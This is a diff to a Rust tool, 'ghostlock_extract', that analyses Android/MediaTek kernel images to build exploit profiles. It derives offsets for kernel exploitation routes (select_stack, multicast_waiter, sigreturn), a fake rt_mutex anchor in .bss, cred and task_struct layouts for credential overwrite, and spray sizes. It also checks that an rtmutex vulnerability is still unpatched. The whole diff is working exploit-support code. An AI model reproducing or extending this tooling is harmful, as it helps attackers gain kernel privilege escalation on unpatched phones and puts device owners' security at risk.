@@ -10,20 +10,24 @@ use ghostlock_extract::anchor;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
+    MULTICAST_5X_BUFFER_SIZE, PSELECT_ROUTE_NFDS, WaiterLayout, derive_cred_5x,
+    derive_nf_logger_registration, derive_pselect_layout, ensure_rtmutex_43499_unpatched,
+    multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::family;
 use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
 use ghostlock_extract::iomem;
+use ghostlock_extract::ikconfig;
 use ghostlock_extract::kallsyms;
 use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
 use ghostlock_extract::payload;
 use ghostlock_extract::report;
+use ghostlock_extract::structs;
 use ghostlock_extract::symbols::{
-    kernel_layout_verified, kernel_struct_macro, resolve_structs, resolve_symbols,
+    kernel_layout_verified, kernel_struct_macro, loggers_anchor_fallback, resolve_structs,
+    resolve_symbols,
 };
 use ghostlock_extract::vendor_boot::recover_kernel_phys_from_vendor_boot;
 
@@ -64,6 +68,10 @@ struct Cli {
     /// route written to --format conf; defaults to the analysis suggestion
     #[arg(long, value_parser = ["tcp_zerocopy", "select_stack", "multicast_waiter", "sigreturn"])]
     route: Option<String>,
+    /// write the per-route feasibility verdicts as JSON (route, verdict,
+    /// numbers, chosen route); exit 7 signals ambiguity
+    #[arg(long)]
+    feasible_out: Option<PathBuf>,
     /// derive the route's lock-anchor region and emit it in --format conf
     #[arg(long)]
     anchor: bool,
@@ -325,8 +333,12 @@ fn run(cli: &Cli) -> Result<i32> {
         return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
     };
 
+    /* The image's release scopes the series template/IKCONFIG predicate below. */
+    let release = boot.release();
     // DRAM base / linear-map offset, and (with the kallsyms delta) the kernel
-    // physical load, from /proc/iomem when available (rooted device or --iomem).
+    // physical load, from /proc/iomem when it is actually readable (rooted
+    // analysis or --iomem). A fresh unprivileged device gets nothing here; both
+    // stay unset and the native's compiled P0 defaults apply.
     let mut kernel_phys_offset: Option<u64> = vendor_boot_phys_offset;
     let iomem_info = match iomem::load(cli.iomem.as_deref()) {
         Ok(info) => info,
@@ -381,10 +393,46 @@ fn run(cli: &Cli) -> Result<i32> {
         );
     }
 
-    let release = boot.release();
+    // The shared template's scope is the series that produced it. The image's
+    // own embedded IKCONFIG is authoritative; the patch range is only the
+    // lowest-priority fallback for a blob-less image.
+    let kernel_config = match ikconfig::KernelConfig::from_image(&boot.kernel) {
+        Ok(config) => Some(config),
+        Err(err) => {
+            eprintln!("warning: embedded IKCONFIG unavailable: {err}");
+            None
+        }
+    };
+    let series = release
+        .as_deref()
+        .map(|release| ikconfig::series_5_10(kernel_config.as_ref(), release))
+        .unwrap_or(ikconfig::SeriesMatch::None {
+            reason: "boot image carries no release string".to_string(),
+        });
+    let series_matched = series.matched();
+    if release.as_deref().is_some_and(family::is_5_10) {
+        match &series {
+            ikconfig::SeriesMatch::Fingerprint { fingerprint } => eprintln!(
+                "info: series ikconfig:{fingerprint} (layout fingerprint matches the \
+                 measured 5.10 series)"
+            ),
+            ikconfig::SeriesMatch::PatchRange { range } => eprintln!(
+                "warning: series patch-range:{range} (no IKCONFIG); every template value \
+                 is a heuristic"
+            ),
+            ikconfig::SeriesMatch::None { reason } => eprintln!(
+                "warning: series none: {reason}; template fields stay null"
+            ),
+        }
+        if let Some(config) = &kernel_config {
+            eprintln!("info: IKCONFIG full hash {}", config.full_hash());
+        }
+    }
     match release.as_deref() {
         Some(release) => {
-            if !kernel_layout_verified(Some(release)) {
+            // 5.10 route geometry is derived from the image, so the 6.x
+            // "unverified family" warning would misstate what was emitted.
+            if !kernel_layout_verified(Some(release)) && !family::is_5_10(release) {
                 let template = kernel_struct_macro(Some(release));
                 eprintln!(
                     "warning: {release} is unverified{}; no family-derived \
@@ -444,6 +492,14 @@ fn run(cli: &Cli) -> Result<i32> {
             allow_disasm: !cli.no_disasm,
         });
         let text = analysis::render(&analysis_report);
+        if let Some(path) = &cli.feasible_out {
+            write_feasible_out(
+                path,
+                release.as_deref().unwrap_or(""),
+                &analysis_report.verdicts,
+                analysis_report.suggestion,
+            )?;
+        }
         if let Some(out) = &cli.out {
             std::fs::write(out, text).map_err(|err| ExtractError::new(format!("{err}")))?;
         } else {
@@ -470,86 +526,125 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
-    // Infeasible pselect geometry only rules out the select_stack route; it is
-    // recorded here and re-checked after route selection instead of aborting.
-    let mut pselect_infeasible: Option<String> = None;
-    if !cli.no_disasm {
-        if let Some(btf) = &btf {
-            match derive_pselect_layout(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                btf,
-                PSELECT_ROUTE_NFDS,
-            ) {
-                Ok(layout) => {
-                    let shift = layout.shift as i64 - 2;
-                    let frame_parts: Vec<String> = [
-                        "frame_pselect_wrapper",
-                        "frame_pselect_dispatch",
-                        "frame_pselect_core",
-                        "frame_futex_wrapper",
-                        "frame_futex_dispatch",
-                        "frame_futex_wait",
-                    ]
-                    .iter()
-                    .filter_map(|key| {
-                        layout.frames.get(*key).map(|value| {
-                            format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
-                        })
+    let release_major = release
+        .as_deref()
+        .and_then(|release| release.split('.').next())
+        .and_then(|part| part.parse::<u32>().ok());
+    // The pselect derivation runs for every image with BTF, and for a 5.10
+    // image without it (the waiter layout is a 5.10 codegen constant). A
+    // derivation failure is Unknown; only a geometric impossibility is
+    // Infeasible.
+    let pselect_outcome = if cli.no_disasm {
+        analysis::PselectOutcome::NotAttempted("--no-disasm")
+    } else if btf.is_some() || release_major == Some(5) {
+        match derive_pselect_layout(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+            PSELECT_ROUTE_NFDS,
+        ) {
+            Ok(layout) => {
+                let shift = layout.shift as i64 - 2;
+                let frame_parts: Vec<String> = [
+                    "frame_pselect_wrapper",
+                    "frame_pselect_dispatch",
+                    "frame_pselect_core",
+                    "frame_futex_wrapper",
+                    "frame_futex_dispatch",
+                    "frame_futex_wait",
+                ]
+                .iter()
+                .filter_map(|key| {
+                    layout.frames.get(*key).map(|value| {
+                        format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
                     })
-                    .collect();
-                    eprintln!(
-                        "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
-                         shift={shift} (derived {} - 2)",
-                        layout.chain,
-                        frame_parts.join(" "),
-                        layout.pselect_buffer,
-                        layout.waiter_local,
-                        layout.shift,
-                    );
-                    derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
-                }
-                Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
-                    pselect_infeasible = Some(message);
-                }
-                Err(err) => {
-                    eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
-                }
+                })
+                .collect();
+                eprintln!(
+                    "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
+                     shift={shift} (derived {} - 2)",
+                    layout.chain,
+                    frame_parts.join(" "),
+                    layout.pselect_buffer,
+                    layout.waiter_local,
+                    layout.shift,
+                );
+                analysis::PselectOutcome::Derived(Box::new(layout))
             }
-            match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
-                Ok(info) => {
-                    derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
-                    eprintln!(
-                        "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}",
-                        info.loggers, info.nfulnl_logger, info.nf_log_type_ulog, info.loggers_0_1
-                    );
-                }
-                Err(err) => {
-                    eprintln!("warning: loggers_0_1 derivation failed: {err}");
-                }
+            Err(ExtractError::Infeasible { message, numbers }) => {
+                eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                analysis::PselectOutcome::Infeasible { message, numbers }
             }
-        } else {
-            eprintln!("warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic");
+            Err(err) => {
+                eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
+                analysis::PselectOutcome::Failed(err.to_string())
+            }
         }
     } else {
-        eprintln!(
-            "warning: --no-disasm; pselect_waiter_shift and loggers_0_1 fall back to \
-             heuristics"
-        );
+        analysis::PselectOutcome::NotAttempted("no embedded BTF")
+    };
+
+    if !cli.no_disasm {
+        match derive_nf_logger_registration(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+        ) {
+            Ok(info) => {
+                derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
+                eprintln!(
+                    "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}{}",
+                    info.loggers,
+                    info.nfulnl_logger,
+                    info.nf_log_type_ulog,
+                    info.loggers_0_1,
+                    if btf.is_none() {
+                        " (no BTF; structure verified, measured anchor)"
+                    } else {
+                        ""
+                    }
+                );
+            }
+            Err(err) => eprintln!("warning: nf_logger derivation failed: {err}"),
+        }
+    } else {
+        eprintln!("info: --no-disasm; nf_logger uses the family fallback");
     }
 
-    let pselect_shift = derived
-        .get("pselect_waiter_shift_value")
-        .copied()
-        .map(|value| value as i64)
-        .or_else(|| {
-            // An infeasible derivation means this image's layout does not exist;
-            // a family default would be wrong, so it is not substituted.
-            if pselect_infeasible.is_some() {
-                return None;
+    /* `resolve_symbols` seeds the measured 5.10 anchor (`loggers+0x10`). Do
+     * not let that constant reach another family: when the derivation did not
+     * close, BTF supplies the enum index, 5.10 keeps the measured constant, and
+     * every other family omits the field rather than shipping a foreign one. */
+    if !derived.contains_key("off_slide_loggers_0_1") {
+        let loggers =
+            kallsyms::unique(&symbols, "loggers").and_then(|value| value.checked_sub(base));
+        let ulog = btf
+            .as_ref()
+            .and_then(|btf| btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG"));
+        let (fallback, source) = loggers_anchor_fallback(
+            loggers,
+            ulog,
+            release.as_deref().is_some_and(family::is_5_10),
+        );
+        symbol_offsets.insert("off_slide_loggers_0_1".to_string(), fallback);
+        match source {
+            "btf-enum" => eprintln!(
+                "info: nf_logger anchor loggers+{:#x} from the BTF enum",
+                ulog.unwrap_or(0) as u64 * 8
+            ),
+            "heuristic-5.10" => {
+                eprintln!("warning: nf_logger anchor uses the measured 5.10 heuristic loggers+0x10")
             }
+            _ => eprintln!("warning: nf_logger anchor omitted; no BTF enum and no family fallback"),
+        }
+    }
+
+    let pselect_shift = match &pselect_outcome {
+        analysis::PselectOutcome::Derived(layout) => Some(layout.shift as i64 - 2),
+        _ if release_major == Some(5) => None,
+        _ => {
             let shift = report::pselect_waiter_shift_for(release.as_deref());
             if let Some(shift) = shift {
                 eprintln!(
@@ -563,21 +658,108 @@ fn run(cli: &Cli) -> Result<i32> {
                 );
             }
             shift
-        });
+        }
+    };
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
     let mut struct_offsets = resolve_structs(btf.as_ref());
+    let mut field_sources: BTreeMap<String, String> = BTreeMap::new();
+    // Per-image derivation first: init_task and copy_process locate the fields
+    // the image itself can prove. A field that does not close stays absent.
+    if btf.is_none() && cli.format == "conf" && !cli.no_disasm {
+        let init_task = kallsyms::unique(&symbols, "init_task");
+        let init_cred = kallsyms::unique(&symbols, "init_cred");
+        let root_task_group = kallsyms::unique(&symbols, "root_task_group");
+        if let (Some(init_task_va), Some(init_task_off)) = (
+            init_task,
+            symbol_offsets.get("off_init_task").copied().flatten(),
+        ) {
+            let derived = structs::derive_task_struct_5_10(
+                &boot.kernel,
+                &rel_symbols,
+                &sorted_offsets,
+                init_task_off,
+                init_task_va,
+                init_cred.unwrap_or(0),
+                root_task_group.unwrap_or(0),
+            );
+            if !derived.values.is_empty() {
+                for (name, value) in &derived.values {
+                    struct_offsets.insert((*name).to_string(), Some(*value));
+                    if let Some(source) = derived.sources.get(name) {
+                        field_sources.insert((*name).to_string(), format!("derived:{source}"));
+                    }
+                }
+                eprintln!(
+                    "info: no BTF; task_struct derived from the image ({} fields)",
+                    derived.values.len()
+                );
+            }
+        }
+    }
     // The template fills the profile contract, not the diagnostic report: the
-    // JSON/text formats keep showing what the image itself yielded.
-    if btf.is_none() && cli.format == "conf" {
-        if let Some(release) = release
-            .as_deref()
-            .filter(|release| family::matches(release))
-        {
-            family::apply_structs(&mut struct_offsets);
+    // JSON/text formats keep showing what the image itself yielded. It fills
+    // only inside the measured series and only the fields the derivation did
+    // not close; a fingerprint mismatch leaves the rest null.
+    if btf.is_none() && cli.format == "conf" && series_matched {
+        for (name, template_value) in family::TASK_FIELDS {
+            match struct_offsets.get(*name).copied().flatten() {
+                Some(derived) if derived != *template_value => eprintln!(
+                    "warning: derived {name}={derived} differs from the measured-series \
+                     template {template_value}; using derived"
+                ),
+                Some(_) => {}
+                None => {
+                    struct_offsets.insert((*name).to_string(), Some(*template_value));
+                    let source = if series.is_heuristic() {
+                        format!("template:{} heuristic", series.label())
+                    } else {
+                        format!("template:{}", series.label())
+                    };
+                    field_sources.insert((*name).to_string(), source);
+                }
+            }
+        }
+        eprintln!(
+            "info: no BTF; task_struct template filled the remaining fields ({})",
+            series.label()
+        );
+        if series.is_heuristic() {
             eprintln!(
-                "info: no BTF; task_struct filled from the diting 5.10 family template ({release})"
+                "warning: task_struct values are heuristic (patch-range series, no IKCONFIG)"
+            );
+        }
+    }
+    // Per-field provenance for the generation log. The app copies these lines
+    // into the parse entry's meta; a later disagreement is reviewable without
+    // re-running the extractor.
+    if btf.is_none() && cli.format == "conf" {
+        for name in struct_offsets.keys() {
+            let source = field_sources.get(name).map(String::as_str).unwrap_or("null");
+            eprintln!("info: field_source {name}={source}");
+        }
+    }
+
+    let route_verdicts = if release_major == Some(5) {
+        analysis::route_verdicts_5_10(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+            &pselect_outcome,
+            !cli.no_disasm,
+        )
+    } else {
+        Vec::new()
+    };
+    if cli.format == "conf" {
+        for verdict in &route_verdicts {
+            eprintln!(
+                "info: route {} {}: {}",
+                verdict.route,
+                verdict.verdict.label(),
+                verdict.reason
             );
         }
     }
@@ -635,10 +817,10 @@ fn run(cli: &Cli) -> Result<i32> {
     }
     if let Some(mm_size) = struct_offsets.get("struct_mm_struct").copied().flatten() {
         eprintln!(
-            "info: sizeof(mm_struct)=0x{mm_size:X} (MM_STRUCT_SZ=0x500 in src/core/common.h)"
+            "info: sizeof(mm_struct)=0x{mm_size:X} (native spray default MM_STRUCT_SZ=0x500)"
         );
         if mm_size > 0x500 {
-            eprintln!("warning: sizeof(mm_struct) exceeds the hardcoded MM_STRUCT_SZ slab stride");
+            eprintln!("warning: sizeof(mm_struct) exceeds the native MM_STRUCT_SZ default (0x500)");
         }
     }
 
@@ -659,14 +841,81 @@ fn run(cli: &Cli) -> Result<i32> {
         // Candidate output: emit everything the image actually yielded and
         // leave the rest out. Whether the result is complete enough to run is
         // decided by the app's pre-execution validation, not here.
-        let route = match cli.route.as_deref() {
-            Some(route) => Some(route.to_string()),
-            None => {
-                match family::route_hint(&boot.kernel, &rel_symbols, &sorted_offsets, release_text)
+        if cli.no_disasm && cli.route.is_none() {
+            return Err(ExtractError::new(
+                "--no-disasm with --format conf requires --route",
+            ));
+        }
+        let route = if release_major == Some(5) {
+            if let Some(forced) = cli.route.as_deref() {
+                match route_verdicts
+                    .iter()
+                    .find(|verdict| verdict.route == forced)
                 {
-                    // The diting 5.10 line has a physical discriminator:
-                    // do_futex's frame depth decides whether select_stack is in
-                    // band.
+                    Some(verdict)
+                        if verdict.verdict == analysis::Feasibility::Infeasible =>
+                    {
+                        eprintln!(
+                            "error: forced route {forced} is infeasible on this kernel: {}",
+                            verdict.reason
+                        );
+                        return Ok(3);
+                    }
+                    Some(verdict) => {
+                        if verdict.verdict == analysis::Feasibility::Unknown {
+                            eprintln!(
+                                "warning: forced route {forced} is unverified (unknown): {}",
+                                verdict.reason
+                            );
+                        }
+                        Some(forced.to_string())
+                    }
+                    None => {
+                        eprintln!("error: unknown route {forced}");
+                        return Ok(3);
+                    }
+                }
+            } else {
+                let hint = family::route_hint(
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                    release_text,
+                );
+                match analysis::select_route_5_10(&route_verdicts, hint) {
+                    analysis::RouteSelection::Chosen {
+                        route,
+                        basis,
+                        reason,
+                    } => {
+                        eprintln!("info: route {route} selected ({basis:?}): {reason}");
+                        Some(route.to_string())
+                    }
+                    analysis::RouteSelection::Ambiguous { routes } => {
+                        if let Some(path) = &cli.feasible_out {
+                            write_feasible_out(path, release_text, &route_verdicts, None)?;
+                        }
+                        eprintln!(
+                            "error: more than one feasible route ({}); pass --route",
+                            routes.join(", ")
+                        );
+                        return Ok(7);
+                    }
+                    analysis::RouteSelection::None { reason } => {
+                        eprintln!("warning: {reason}");
+                        None
+                    }
+                }
+            }
+        } else {
+            match cli.route.as_deref() {
+                Some(route) => Some(route.to_string()),
+                None => match family::route_hint(
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                    release_text,
+                ) {
                     Some((hint, reason)) => {
                         eprintln!("info: {reason}");
                         Some(hint.to_string())
@@ -678,76 +927,145 @@ fn run(cli: &Cli) -> Result<i32> {
                             &rel_symbols,
                             &sorted_offsets,
                         );
-                        let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
-                        let (suggested, _, _) =
-                            analysis::suggest_route(pselect_derived, &paths, release.as_deref());
+                        let pselect_derived =
+                            matches!(pselect_outcome, analysis::PselectOutcome::Derived(_));
+                        let (suggested, _, _) = analysis::suggest_route(
+                            pselect_derived,
+                            &paths,
+                            release.as_deref(),
+                        );
                         suggested.map(str::to_string)
                     }
-                }
+                },
             }
         };
+        if let Some(path) = &cli.feasible_out {
+            write_feasible_out(path, release_text, &route_verdicts, route.as_deref())?;
+        }
         // select_stack is the only route that needs the derived pselect layout;
-        // reject it here, after selection, so tcp/multicast can still proceed.
-        if route
-            .as_deref()
-            .is_some_and(analysis::route_depends_on_pselect_layout)
+        // the 5.10 path already refused a forced Infeasible route, so this is
+        // the pre-5.10 (family) path.
+        if release_major != Some(5)
+            && route
+                .as_deref()
+                .is_some_and(analysis::route_depends_on_pselect_layout)
         {
-            if let Some(message) = &pselect_infeasible {
+            if let analysis::PselectOutcome::Infeasible { message, .. } = &pselect_outcome {
                 eprintln!("error: pselect route not feasible on this kernel: {message}");
                 return Ok(3);
             }
         }
+        let route_shift = if route.as_deref() == Some("select_stack") {
+            pselect_shift.or_else(|| {
+                if release_major == Some(5) {
+                    eprintln!(
+                        "warning: select_stack has no derived geometry; emitting the \
+                         family waiter_shift={} as a labelled heuristic",
+                        family::SELECT_WAITER_SHIFT
+                    );
+                    Some(family::SELECT_WAITER_SHIFT)
+                } else {
+                    None
+                }
+            })
+        } else {
+            pselect_shift
+        };
+        let sigreturn_offsets = route_verdicts
+            .iter()
+            .find(|verdict| {
+                verdict.route == "sigreturn"
+                    && verdict.verdict == analysis::Feasibility::Feasible
+            })
+            .and_then(|verdict| {
+                Some((
+                    *verdict.numbers.get("off_sve")?,
+                    *verdict.numbers.get("off_plain")?,
+                ))
+            });
+        if route.as_deref() == Some("sigreturn") && sigreturn_offsets.is_none() {
+            eprintln!(
+                "warning: sigreturn geometry has no image derivation; using the 5.10 \
+                 patch-range constants as a heuristic"
+            );
+        }
         let mut geometry = route
             .as_deref()
             .map(|route| {
-                report::conf_route_geometry(route, release_text, pselect_shift, &struct_offsets)
+                report::conf_route_geometry_with_sigreturn(
+                    route,
+                    release_text,
+                    route_shift,
+                    sigreturn_offsets,
+                    &struct_offsets,
+                )
             })
             .unwrap_or_default();
         // 5.x multicast: replace the proven-constant waiter_off with the value
         // statically derived from this image's setsockopt/futex stack frames.
         // No device or root is involved; the A301SO image reproduces its
-        // hardware-probed 0x60.
-        if route.as_deref() == Some("multicast_waiter") {
-            const MCAST_BUFFER_SIZE: u64 = 264;
-            const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
-            match multicast_waiter_off(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                MCAST_BUFFER_SIZE,
-                RT_MUTEX_WAITER_PI_TREE_ENTRY,
-            ) {
-                Ok(geom) => {
-                    eprintln!(
-                        "info: multicast waiter_off derived = 0x{:x} \
-                         (setsockopt depth 0x{:x} - futex depth 0x{:x})",
-                        geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
-                    );
-                    for entry in geometry.iter_mut() {
-                        if entry.0 == "waiter_off" {
-                            entry.1 = geom.waiter_off as i64;
+        // hardware-probed 0x60. The copy-window rule inside the derivation is
+        // the same one the verdict applied.
+        if route.as_deref() == Some("multicast_waiter") && !cli.no_disasm {
+            let layout = if release_major == Some(5) {
+                match btf.as_ref() {
+                    Some(btf) => WaiterLayout::from_btf(btf).ok(),
+                    None => Some(family::waiter_layout_5_10()),
+                }
+            } else {
+                btf.as_ref().and_then(|btf| WaiterLayout::from_btf(btf).ok())
+            };
+            match layout.and_then(|layout| layout.lock.map(|lock| (layout, lock))) {
+                Some((layout, lock)) => match multicast_waiter_off(
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                    MULTICAST_5X_BUFFER_SIZE as u64,
+                    layout.pi_tree_entry,
+                    lock,
+                ) {
+                    Ok(geom) => {
+                        eprintln!(
+                            "info: multicast waiter_off derived = 0x{:x} \
+                             (setsockopt depth 0x{:x} - futex depth 0x{:x})",
+                            geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
+                        );
+                        for entry in geometry.iter_mut() {
+                            if entry.0 == "waiter_off" {
+                                entry.1 = geom.waiter_off as i64;
+                            }
                         }
                     }
-                }
-                Err(err) => eprintln!(
-                    "warning: static multicast waiter_off derivation failed: {err}; \
-                     keeping the proven 5.x constant"
+                    Err(err) => eprintln!(
+                        "warning: static multicast waiter_off derivation failed: {err}; \
+                         keeping the proven 5.x constant as a heuristic"
+                    ),
+                },
+                None => eprintln!(
+                    "warning: multicast waiter layout unavailable; keeping the proven 5.x \
+                     constant as a heuristic"
                 ),
             }
+        } else if route.as_deref() == Some("multicast_waiter") {
+            eprintln!(
+                "warning: --no-disasm; keeping the proven 5.x multicast constants as a \
+                 heuristic"
+            );
         }
         // On-device derivation: the fake rt_mutex lives in a zeroed .bss
         // region; the anchor triple is per image (offset, safe length, slot
         // pitch). The pitch is the family's sizeof(rt_mutex): the anchor scan
         // does not derive it (docs/analysis/anchor-derivation-plan.md).
-        if cli.anchor && family::matches(release_text) {
+        if cli.anchor && series_matched {
             match route.as_deref() {
                 Some(route) if route == "select_stack" || route == "sigreturn" => {
-                    match anchor::best_candidate(
+                    let pick = anchor::select_candidate(
                         &boot.kernel,
                         &rel_symbols,
                         Some("dump_skip.zeroes"),
-                    ) {
-                        Some(a) => {
+                    );
+                    match (pick.selected, pick.refused) {
+                        (Some(a), _) => {
                             eprintln!(
                                 "info: lock anchor {} +0x{:x}, 0x{:x} bytes, stride {}, verdict {}",
                                 a.candidate.name,
@@ -760,7 +1078,15 @@ fn run(cli: &Cli) -> Result<i32> {
                             geometry.push(("lock_anchor_bytes", a.safe_len as i64));
                             geometry.push(("lock_anchor_stride", family::ANCHOR_STRIDE as i64));
                         }
-                        None => eprintln!(
+                        (None, Some(a)) => eprintln!(
+                            "warning: lock anchor {} +0x{:x} refused: verdict {} ({}); \
+                             the anchor triple is omitted",
+                            a.candidate.name,
+                            a.candidate.offset,
+                            a.verdict.label(),
+                            a.stopped_by,
+                        ),
+                        (None, None) => eprintln!(
                             "warning: --anchor found no usable .bss region; the profile falls \
                              back to the reclaimed page"
                         ),
@@ -809,11 +1135,60 @@ fn run(cli: &Cli) -> Result<i32> {
             });
             match derived_cred {
                 Some(cred) => cred,
-                None if family::matches(release_text) => {
+                None if series_matched => {
                     let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten();
-                    match init_cred_off
-                        .and_then(|offset| family::cred_from_image(&boot.kernel, offset, base))
-                    {
+                    let derived = init_cred_off.and_then(|offset| {
+                        structs::derive_cred_layout_5_10(&boot.kernel, offset, base)
+                    });
+                    let cred = match derived {
+                        Some(cred) => {
+                            eprintln!(
+                                "info: no BTF; cred caps and refs derived from init_cred \
+                                 ({} refs, caps at {:#x})",
+                                cred.refs.len(),
+                                cred.caps_offset
+                            );
+                            field_sources.insert(
+                                "cred_layout.caps".to_string(),
+                                "derived:init_cred".to_string(),
+                            );
+                            field_sources.insert(
+                                "cred_layout.refs".to_string(),
+                                "derived:init_cred".to_string(),
+                            );
+                            Some(cred)
+                        }
+                        None => {
+                            let fallback = init_cred_off.and_then(|offset| {
+                                family::cred_from_image(&boot.kernel, offset, base)
+                            });
+                            if fallback.is_some() {
+                                eprintln!(
+                                    "warning: cred layout derivation failed; using the \
+                                     measured-series offsets ({})",
+                                    series.label()
+                                );
+                                field_sources.insert(
+                                    "cred_layout.caps".to_string(),
+                                    format!("family-constant:{}", series.label()),
+                                );
+                                field_sources.insert(
+                                    "cred_layout.refs".to_string(),
+                                    format!("family-constant:{}", series.label()),
+                                );
+                            }
+                            fallback
+                        }
+                    };
+                    field_sources.insert(
+                        "cred_layout.copy_size".to_string(),
+                        format!("template:{}", series.label()),
+                    );
+                    field_sources.insert(
+                        "cred_layout.usage".to_string(),
+                        "family-constant:5.10".to_string(),
+                    );
+                    match cred {
                         Some(cred) => {
                             let mut entries = report::conf_cred_5x(&cred, family::CRED_COPY_SIZE);
                             entries.push((
@@ -822,10 +1197,12 @@ fn run(cli: &Cli) -> Result<i32> {
                             ));
                             entries.push(("ref3_offset".to_string(), "0".to_string()));
                             entries.push(("ref3_image".to_string(), "0".to_string()));
-                            eprintln!(
-                                "info: no BTF; cred refs read from init_cred at the diting 5.10 \
-                                 family offsets"
-                            );
+                            if series.is_heuristic() {
+                                eprintln!(
+                                    "warning: cred copy size and usage are heuristic \
+                                     (patch-range series, no IKCONFIG)"
+                                );
+                            }
                             entries
                         }
                         None => {
@@ -848,6 +1225,16 @@ fn run(cli: &Cli) -> Result<i32> {
         } else {
             report::conf_cred_6x()
         };
+        for name in [
+            "cred_layout.caps",
+            "cred_layout.refs",
+            "cred_layout.copy_size",
+            "cred_layout.usage",
+        ] {
+            if let Some(source) = field_sources.get(name) {
+                eprintln!("info: field_source {name}={source}");
+            }
+        }
         let extra_offsets = report::ConfExtraOffsets {
             empty_zero_page: kallsyms::unique(&symbols, "empty_zero_page")
                 .and_then(|value| value.checked_sub(base)),
@@ -912,7 +1299,7 @@ fn main() {
             // 5 kallsyms recovery failure,
             // 6 primitive already fixed.
             let code = match &err {
-                ExtractError::Infeasible(_) => 3,
+                ExtractError::Infeasible { .. } => 3,
                 ExtractError::Unsupported(_) => 4,
                 ExtractError::AlreadyFixed(_) => 6,
                 ExtractError::Kallsyms(_) => 5,
@@ -921,6 +1308,31 @@ fn main() {
             std::process::exit(code);
         }
     }
+}
+
+/// Render the `--feasible-out` JSON: the per-route verdicts the app's
+/// two-pass ambiguity flow reads, plus the route this pass chose (null when
+/// the routes are ambiguous or none is feasible).
+#[derive(serde::Serialize)]
+struct FeasibleOut<'a> {
+    release: &'a str,
+    routes: &'a [analysis::RouteVerdict],
+    chosen: Option<&'a str>,
+}
+
+fn write_feasible_out(
+    path: &Path,
+    release: &str,
+    verdicts: &[analysis::RouteVerdict],
+    chosen: Option<&str>,
+) -> Result<()> {
+    let text = serde_json::to_string_pretty(&FeasibleOut {
+        release,
+        routes: verdicts,
+        chosen,
+    })
+    .map_err(|err| ExtractError::new(format!("cannot serialize feasible-out: {err}")))?;
+    std::fs::write(path, text + "\n").map_err(|err| ExtractError::new(format!("{err}")))
 }
 
 /// Render the `--anchor-scan` report.
